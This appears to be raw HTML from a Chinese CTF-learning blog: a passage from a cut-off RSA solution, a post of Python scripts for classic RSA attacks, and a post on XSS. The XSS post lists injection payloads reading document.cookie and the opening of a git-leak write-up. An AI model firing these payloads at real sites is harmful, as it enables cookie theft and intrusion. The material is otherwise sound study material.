class="line">e2=gmpy2.mpz(e2//<span class="number">14</span>)</span><br><span class="line">d1 = gmpy2.invert(e1,fn1)</span><br><span class="line">d2 = gmpy2.invert(e2,fn2)</span><br><span class="line"></span><br><span class="line">m1=pow(c1,d1,n1)</span><br><span class="line">m2=pow(c2,d2,n2)</span><br><span class="line">c=libnum.solve_crt([m1,m1,m2],[p,q1,q2])<span class="comment">#求解中国剩余定理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(libnum.gcd(14,(q1-1)*(q2-1)))</span></span><br><span class="line"><span class="comment">#由于存在公约数2，所以整个问题就化简为了e=7，c=...,n=...的新问题</span></span><br><span class="line">e=<span class="number">7</span></span><br><span class="line">n=q1*q2</span><br><span class="line">fn=(q1<span class="number">-1</span>)*(q2<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">t=gmpy2.iroot(m, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">print(libnum.n2s(t))</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/08/RSA%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/08/RSA%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/" class="post-title-link" itemprop="url">Crypto学习笔记(RSA攻击脚本实现)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-08 23:52:12" itemprop="dateCreated datePublished" datetime="2020-11-08T23:52:12+08:00">2020-11-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-15 12:41:28" itemprop="dateModified" datetime="2020-11-15T12:41:28+08:00">2020-11-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Crypto/" itemprop="url" rel="index"><span itemprop="name">Crypto</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="gmpy2相关函数"><a href="#gmpy2相关函数" class="headerlink" title="gmpy2相关函数"></a>gmpy2相关函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">gmpy2.mpz(n)<span class="comment">#初始化一个大整数</span></span><br><span class="line">gmpy2.mpfr(x)<span class="comment"># 初始化一个高精度浮点数x</span></span><br><span class="line">d = gmpy2.invert(e,n) <span class="comment"># 求逆元，de = 1 mod n</span></span><br><span class="line">C = gmpy2.powmod(M,e,n)<span class="comment"># 幂取模，结果是 C = (M^e) mod n</span></span><br><span class="line">gmpy2.is_prime(n) <span class="comment">#素性检测</span></span><br><span class="line">gmpy2.gcd(a,b) <span class="comment">#欧几里得算法，最大公约数</span></span><br><span class="line">gmpy2.gcdext(a,b) <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">gmpy2.iroot(x,n) <span class="comment">#x开n次根 返回的第一个值表示开方后结果 第二个值表示是否能开尽</span></span><br></pre></td></tr></table></figure>
<h4 id="各方信息"><a href="#各方信息" class="headerlink" title="各方信息"></a>各方信息</h4><p>通信者A(解密方):掌握全部数据  p、q、公钥(n，e)、密文c </p>
<p>通信者B(加密方): 公钥(e，n)、密文c、明文m</p>
<p>攻击者C:公钥(e，n）、密文c</p>
<p>通信者A通过p、q计算得到d然后根据私钥（e，n）解出明文m</p>
<h4 id="解密者角度"><a href="#解密者角度" class="headerlink" title="解密者角度"></a>解密者角度</h4><h5 id="1-已知p、q、e求d"><a href="#1-已知p、q、e求d" class="headerlink" title="1.已知p、q、e求d"></a>1.已知p、q、e求d</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = libnum.modular.invmod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">##通过primefac也可以实现求d 不过prime只支持python2环境</span></span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line">d=prime.modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))%((p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##通过gmpy2也可以实现求d</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#其中gmpy2.mpz()函数起初始化大整数的作用</span></span><br><span class="line">p=gmpy2.mpz($p) </span><br><span class="line">q=gmpy2.mpz($q)</span><br><span class="line">e=gmpy2.mpz($e)</span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
<h4 id="攻击者角度"><a href="#攻击者角度" class="headerlink" title="攻击者角度"></a>攻击者角度</h4><p>攻击者与解密者的信息差距往往就是p、q，其目标往往是获取密文m</p>
<h5 id="模数分解"><a href="#模数分解" class="headerlink" title="模数分解"></a>模数分解</h5><p>1 对于n比较小(256bit)的情况，可以通过yafu直接模数分解n，通过p、q、e求得d，而后</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to bytes</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#long_to_bytes实现将m转化为字符串</span></span><br></pre></td></tr></table></figure>
<p>2 yafu的分解同时集成了<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Fermat&#39;s_factorization_method">费马分解</a>和<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Pollard&#39;s_rho_algorithm">Pollard_rho分解</a>，所以有的时候即使n的长度是1024bit，也会由于其中一个素因子太小或两个因子相差不大成功分解。</p>
<p>3 公约数模数分解</p>
<p>进行两次通信会产生两个n，如果通信者A在两次通信中生成的大素数有一个是相同的，那攻击者C就可以对两次的n进行公约数计算从而得到n</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p&#x3D;gmpy2.gcd(n1,n2)</span><br><span class="line">q1&#x3D;n1&#x2F;p</span><br><span class="line">q2&#x3D;n2&#x2F;p</span><br></pre></td></tr></table></figure>
<h5 id="小指数明文爆破"><a href="#小指数明文爆破" class="headerlink" title="小指数明文爆破"></a>小指数明文爆破</h5><p>加密方B得到A的公钥(n，e)，如果e比较小，则会$m^e&lt;n$,则$c=m^e$ 此时直接对c开e次方就得到m，但有时候并不是这么极端 但可能$m^e$也没有超过n太多，于是可以爆破出m</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime, isPrime</span><br><span class="line">n = <span class="number">47966708183289639962501363163761864399454241691014467172805658518368423135168025285144721028476297179341434450931955275325060173656301959484440112740411109153032840150659</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">10968126341413081941567552025256642365567988931403833266852196599058668508079150528128483441934584299102782386592369069626088211004467782012298322278772376088171342152839</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">if</span> (gmpy2.iroot(c + i * n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):<span class="comment">#第二个参数[1]判断能否开尽</span></span><br><span class="line">    print(long_to_bytes(gmpy2.iroot(c + i * n, <span class="number">3</span>)[<span class="number">0</span>]))<span class="comment">#第一个参数[0]表示开方后得到的数</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="选择密文攻击"><a href="#选择密文攻击" class="headerlink" title="选择密文攻击"></a>选择密文攻击</h5><p>攻击方可以对任意密文解密，除了C。那可以先求出C在N上的逆元$C^{-1}$,然后求$C^{-1}$的明文$M^{‘}$,$M^{‘}$即为明文M的逆元。</p>
<h5 id="LLL-attack"><a href="#LLL-attack" class="headerlink" title="LLL-attack"></a>LLL-attack</h5><p>e太小，m部分泄露或者p泄露三分之二的情况下使用。用于LLLattack的<a target="_blank" rel="noopener" href="https://github.com/mimoo/RSA-and-LLL-attacks">sage代码</a>。</p>
<h5 id="Wiener-Attack-amp-Boneh-Durfee-Attack"><a href="#Wiener-Attack-amp-Boneh-Durfee-Attack" class="headerlink" title="Wiener Attack &amp; Boneh Durfee Attack"></a>Wiener Attack &amp; Boneh Durfee Attack</h5><p>一般e很大，远超65537，就基本可以确定是Wiener Attack。可以采用<a target="_blank" rel="noopener" href="https://github.com/pablocelayes/rsa-wiener-attack">维纳攻击脚本</a>。</p>
<h5 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h5><p>A在两次通信中采用相同的n，B对相同的m进行加密。采用以下脚本解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_n_attack</span>(<span class="params">n,e1,e2,c1,c2</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">        x, lastX = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">        y, lastY = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (b != <span class="number">0</span>):</span><br><span class="line">            q = a // b   <span class="comment">#整除</span></span><br><span class="line">            a, b = b, a % b</span><br><span class="line">            x, lastX = lastX - q * x, x</span><br><span class="line">            y, lastY = lastY - q * y, y</span><br><span class="line">        <span class="keyword">return</span> (lastX, lastY)</span><br><span class="line"></span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">        <span class="keyword">if</span> c1&lt;<span class="number">0</span>:</span><br><span class="line">            c1+=n</span><br><span class="line">    <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">        <span class="keyword">if</span> c2&lt;<span class="number">0</span>:</span><br><span class="line">            c2+=n</span><br><span class="line">    m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">n1=<span class="number">21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061</span></span><br><span class="line">e1=<span class="number">65537</span></span><br><span class="line">c1=<span class="number">11623242520063564721509699039034210329314238234068836130756457335142671659158578379060500554276831657322012285562047706736377103534543565179660863796496071187533860896148153856845638989384429658963134915230898572173720454271369543435708994457280819363318783413033774014447450648051500214508699056865320506104733203716242071136228269326451412159760818676814129428252523248822316633339393821052614033884661649376604245744651142959498917235138077366818109892738298251161767344501687113868331134288984466294415889635863660753717476594011236542159800099371872396181448655448842148998667568104710807411358117939831241620315</span></span><br><span class="line">n2=<span class="number">21660190931013270559487983141966347279666044468572000325628282578595119101840917794617733535995976710097702806131277006786522442555607842485975616689297559583352413160087163656851019769465637856967511819803473940154712516380580146620018921406354668604523723340895843009899397618067679200188650754096242296166060735958270930743173912010852467114047301529983496669250671342730804149428700280401481421735184899965468191802844285699985370238528163505674350380528600143880619512293622576854525700785474101747293316814980311297382429844950643977825771268757304088259531258222093667847468898823367251824316888563269155865061</span></span><br><span class="line">e2=<span class="number">70001</span></span><br><span class="line">c2=<span class="number">8180690717251057689732022736872836938270075717486355807317876695012318283159440935866297644561407238807004565510263413544530421072353735781284166685919420305808123063907272925594909852212249704923889776430284878600408776341129645414000647100303326242514023325498519509077311907161849407990649396330146146728447312754091670139159346316264091798623764434932753276554781692238428057951593104821823029665203821775755835076337570281155689527215367647821372680421305939449511621244288104229290161484649056505784641486376741409443450331991557221540050574024894427139331416236263783977068315294198184169154352536388685040531</span></span><br><span class="line"><span class="keyword">print</span> (long_to_bytes(same_n_attack(n1,e1,e2,c1,c2)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="广播攻击"><a href="#广播攻击" class="headerlink" title="广播攻击"></a>广播攻击</h5><p>加密的过程中e较小，且这几次加密过程中 ，加密信息相同，即</p>
<script type="math/tex; mode=display">
c_1\equiv m^e\mod n_1\\c_2\equiv m^e\mod n_2\\c_3\equiv m^e\mod n_3</script><p>那么通过<a href="[https://zh.wikipedia.org/zh-hans/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86](https://zh.wikipedia.org/zh-hans/中国剩余定理">中国剩余定理</a>)，计算$c_x\equiv m^3\mod n_1n_2n_3$,然后对$c_x$开e次方根得到m</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">n1 = <span class="number">24451423288348328116705189839080049401203825573696682939697089229515670854259668024738917571672083091736391032222439276176190670330149788177234868093407333559601300076140811141390059132774991537248278852195374559377914946861163565102316087142050792987559132773464700849304645152015574005517342653095585568809642839372678062663523564820583166717521739237792276166111668361172039147292768193129632684171172002382830408379067354719706121993642173739213280355600134781117773160460528207346288478815871296055864733062408148349209845936379646848651625713969508821074528754713838207135211670970387019665490891554278609420811</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">c1 = <span class="number">15739875616514630953136118518167425336566344729401649295136386816279793948062937416837879973892217898183001604612634670589995445217883630705454669275572015747596408894160611264926362963690714019483949272102316017165459832305673786710006588680357259384309205799575411881386856841704490851908762197421112221154073096284400634344102924080733996136266689995846872435464641531701655540246069568899209408835603371228683787516867834686720338208876553150308049787749151860312456421834317148300953317025532490631516416557696361667176077040251336722246089493549323185006889559952252279223464226121335279699764156011687694705461</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">26371477190418742303888775088555323015207366776923126851773114394065723645672368088814181502360410900641156468215436455676418853504498893778165004679238083105115284038962860549618453609620564211541961829192628570279313244745190283361932206525212450405965917102560591225166296026203946023621569117063731896380036557814205848678875929376998512733964346619930409595564029979283595842765495546420008144195139735377286287069524605209733051251754274764107934939709473307270046001810101986138988618191726147463699979330655595693169524011001045064479429960522005088680268206848597198271413010280267566035795254656463702698823</span></span><br><span class="line">e2 = <span class="number">3</span></span><br><span class="line">c2 = <span class="number">24491112204092744341358638089215970530809389175921723500286573918429636398447936137595118862398236862698779775682952162653546124550629784165964386769387726103595283121496975198529062258433280603856760220088192538482626338903512801906921311030654216689591936509151350395249697750541120735732723071144598196884071338084546259983640953398715738096470608250955118848652845310318107343620885777444921011193265422744126912733993340865179850073221405567439254502574578925781409459433294016640150862732200176452820665011738329510188452740687455054869063245100602567671645540401390791588456748406543904714454899841545079587056</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">27487047904330959883767333331462030929928491213958156653308086307319240141800614908094361257431882391215313284438555713825838241511527538964789800420812050047003596770148880871768715848882256199410164419506052779212555843479717842656396150794330441002831153507102960164073640832600708150242550799365929109808430251649175060381698677302608174255794872628187783088414186634174367531662043643358473337581486905937469115169466276315070659112396585619309358563546478189304744220858913259592690589213905377550443295883410708775472142360727764158039142452443204569417848208594378792577246174638639911159712430937128321437067</span></span><br><span class="line">e3 = <span class="number">3</span></span><br><span class="line">c3 = <span class="number">1657721854648476317520442150896650605711954769246991233391881094037826060908691858031485703087740392488258133124921363936766424042899719887649974751632127107022899794941279627494196541358161346953558285922698679387524282160943205189313406083166270966025941354796192171615197811422473937679394910921908268579426452496116103480709293429547721026538860977229195889575005308631157579567095561669277297494272383133948347665024419752146336618756926080138955963546588675787675378048078021878779569010236088293191739741596470893703755598233769968042607918446569365734945861279726941898996019192367675358423090129022372729450</span></span><br><span class="line">m1, m2, m3 = invert(n2 * n3, n1), invert(n1 * n3, n2), invert(n1 * n2, n3)</span><br><span class="line">x = (c1 * (m1 % n1) * n2 * n3 + c2 * (m2 % n2) * n1 * n3 + c3 * (m3 % n3) * n2 * n1) % (n1 * n2 * n3)</span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line">m, n = iroot(x, e1)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
<h5 id="相关消息攻击"><a href="#相关消息攻击" class="headerlink" title="相关消息攻击"></a>相关消息攻击</h5><p>加密者B使用同一公钥对两个具有某种线性关系的消息m1,m2进行加密 得到c1,c2。</p>
<p>假设模数为N，两种之间的线性关系为$M_1=a*M_2+b$，则当e=3时，则有</p>
<script type="math/tex; mode=display">
M_2=\frac{2a^3bC^2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}</script><p>Python代码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">relate_message_attack</span>(<span class="params">a,b,c1,c2,n</span>):</span></span><br><span class="line">    b3=gmpy2.powmod(b,<span class="number">3</span>,n)</span><br><span class="line">    part1=b*(c1+<span class="number">2</span>*c2-b3)%n</span><br><span class="line">    part2=a*(c1-c2+<span class="number">2</span>*b3)%n</span><br><span class="line">    part2=gmpy2.invert(part2,n)</span><br><span class="line">    <span class="keyword">return</span> part1*part2%n</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/03/xss%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gorgeousdays">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/03/xss%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">XSS攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-11-03 22:35:41 / 修改时间：22:36:41" itemprop="dateCreated datePublished" datetime="2020-11-03T22:35:41+08:00">2020-11-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>XSS根源就是没完全过滤客户端提交的数据,客户端提交的数据本来是应用需要的，但恶意攻击者可能在提交的数据中插入一些符号以及javascript代码，使得这些数据成为应用代码的一部分。</p>
<p>sql注入拼接的是操作数据库的sql语句。xss拼接的是网页的html代码。拼接合适的html代码去执行恶意的js语句。</p>
<p>例如原有一个textbox的代码为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;value1from&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户输入</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">!-</span></span></span><br></pre></td></tr></table></figure>
<p>则执行代码变为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;address1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">!-</span> &quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户输入<code>&quot;onfocus=&quot;alert(document.cookie)</code>代码所触发的事件也会有改变也会被改变。所以XSS攻击的威力取决于用户输入什么样的脚本。</p>
<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>提交数据 实现xss 但只对这次访问产生影响，并持久性攻击。</p>
<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>提交数据 实现xss 并且存进了数据库，别人访问这个页面就会自动触发</p>
<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。从效果上来说 它也是反射型XSS。</p>
<h4 id="如何检测是否存在XSS"><a href="#如何检测是否存在XSS" class="headerlink" title="如何检测是否存在XSS"></a>如何检测是否存在XSS</h4><p>发送语句给服务器，如果服务器没有进行过滤，服务器则会返回给客户端，则服务器存在XSS漏洞。判断XSS漏洞即主要看服务其端给客户端的响应。</p>
<p>常见的发送位置：留言板、评论、搜索</p>
<h4 id="XSS检测总结"><a href="#XSS检测总结" class="headerlink" title="XSS检测总结"></a>XSS检测总结</h4><h5 id="常用XSS检测"><a href="#常用XSS检测" class="headerlink" title="常用XSS检测"></a>常用XSS检测</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>各种绕过参考链接。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/applelife/p/10477583.html#_label8">https://www.cnblogs.com/applelife/p/10477583.html#_label8</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tugenhua0707/p/10909284.html#_labe3">https://www.cnblogs.com/tugenhua0707/p/10909284.html#_labe3</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qw_xingzhe/article/details/80712840">https://blog.csdn.net/qw_xingzhe/article/details/80712840</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ricardojxu/p/12856312.html">https://www.cnblogs.com/ricardojxu/p/12856312.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/90536.htm">https://www.jb51.net/article/90536.htm</a></p>
<h4 id="XSS题型训练平台"><a href="#XSS题型训练平台" class="headerlink" title="XSS题型训练平台"></a>XSS题型训练平台</h4><p><a target="_blank" rel="noopener" href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
<h4 id="例题：-BJDCTF-2nd-xss之光"><a href="#例题：-BJDCTF-2nd-xss之光" class="headerlink" title="例题：[BJDCTF 2nd]xss之光"></a>例题：[BJDCTF 2nd]xss之光</h4><h5 id="判断是否存在git泄露"><a href="#判断是否存在git泄露" class="headerlink" title="判断是否存在git泄露"></a>判断是否存在git泄露</h5><p>1.构造URL<code>/.git/config</code>  存在可下载文件 发现存在git泄露</p>
<p>2.使用 <strong>dirsearch、御剑</strong>等工具扫描后台</p>
<p>发现存在git泄露</p>
<h5 id="通过Githack获取泄露的源代码"><a href="#通过Githack获取泄露的源代码" class="headerlink" title="通过Githack获取泄露的源代码"></a>通过Githack获取泄露的源代码</h5><p>通过<code>python Githack.py &lt;url&gt;/.git/</code>命令获取到<code>index.php</code>文件 需要<strong>python2版本</strong></p>
